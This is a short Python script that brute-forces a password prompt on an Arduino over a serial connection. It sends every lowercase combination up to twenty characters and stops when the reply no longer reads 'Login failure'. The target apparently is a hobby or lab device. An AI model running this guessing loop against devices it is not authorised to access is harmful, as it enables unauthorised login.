import serial
import time
import itertools
import string

# Configure serial connection
arduino_port = 'COM10'  # Adjust to your port, e.g., '/dev/ttyUSB0' for Linux
baud_rate = 115200
timeout_duration = 1  # Set timeout duration

ser = serial.Serial(arduino_port, baud_rate, timeout=timeout_duration)
time.sleep(2)  # Give time for the connection to initialize

def send_data(string):
    ser.write(bytes(string + '\n', 'utf-8'))
    time.sleep(0.1)

def brute_force_password():
    """Attempts to brute-force the password by trying different combinations."""
    chars = string.ascii_lowercase  # Define the character set (you can include more chars if needed)
    max_length = 20  # Adjust the maximum length based on your password requirements

    for length in range(1, max_length + 1):
        # Create all combinations of length characters
        for guess in itertools.product(chars, repeat=length):
            ser.reset_input_buffer()
            password_guess = ''.join(guess)
            print(f"Trying password: {password_guess}")
            
            # Send the password to Arduino
            send_data(password_guess)
            
            # Wait for Arduino's response
            response = ser.readline().decode('utf-8').strip()
            
            # Check if the response indicates success
            if "Login failure" not in response:  # Adjust this based on the Arduino's success message
                print(f"Password found: {password_guess}")
                return password_guess

def read_response():
    return ser.readline().decode('utf-8').strip()

try:
    send_data('')  # Skip prompt for password
    time.sleep(2)

    print(f'Arduino says: {read_response()}')

    # Start brute-force attack
    password = brute_force_password()

except serial.SerialException as e:
    print(f"Serial connection error: {e}")
finally:
    if ser.is_open:
        ser.close()  # Close the serial connection when done